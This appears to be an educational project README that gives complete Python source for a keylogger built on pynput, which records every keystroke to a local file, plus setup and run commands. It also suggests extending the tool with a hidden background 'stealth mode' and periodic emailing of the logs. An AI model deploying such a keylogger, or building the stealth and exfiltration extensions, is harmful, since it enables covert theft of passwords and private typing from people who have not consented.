# Task-2-Keylogger-Software
Task 2 Keylogger Software  Description: Keylogger software is a good beginner-level cyber security project. A keylogger is software used to record every keystroke made by the user on their keyboard devices.



Plan for Educational Keylogger Development
The following plan outlines how to create a basic keylogger for learning purposes only. This keylogger will be developed in Python for simplicity.

Step 1: Environment Setup
Install Python (if not already installed).

Download from python.org.
Install Required Libraries: Use pip to install the following:

bash
Copy code
pip install pynput
pynput: A library to listen to keyboard events.
Step 2: Keylogger Code
Create a Python script called keylogger.py:

python
Copy code
from pynput import keyboard

# File to store the recorded keystrokes
LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as log:
            log.write(f"{key.char}")
    except AttributeError:  # Special keys (e.g., Shift, Ctrl)
        with open(LOG_FILE, "a") as log:
            log.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:  # Stop listener on Escape key
        return False

# Set up a listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger is running. Press 'Escape' to stop.")
    listener.join()
How It Works
Key Event Listener:

The pynput library listens to key presses and releases.
It records alphanumeric keys (key.char) and special keys (e.g., [Shift]).
Log File:

Keystrokes are saved in keylog.txt in the script's directory.
Exit Mechanism:

Pressing the Escape key stops the logger.
Step 3: Testing
Run the script in the terminal:

bash
Copy code
python keylogger.py
Type on your keyboard while the script is running.

Open keylog.txt to view the recorded keystrokes.

Extending the Project
Add Timestamps: Record the time of each keystroke:

python
Copy code
import time
log.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n")
Stealth Mode: Make the script run in the background (e.g., as a hidden process). Note: This must comply with legal and ethical standards.

Email Logs: Send logs via email periodically (e.g., using smtplib).

Platform-Specific Features: Adjust the script for Windows, macOS, or Linux if necessary.

Important Considerations
Ethical Usage: Use only on your own devices or in environments where you have explicit permission.
Secure the Logs: Encrypt or protect the log file to avoid misuse.
Avoid Misuse: Any unauthorized deployment or use of a keylogger is strictly illegal and unethical.
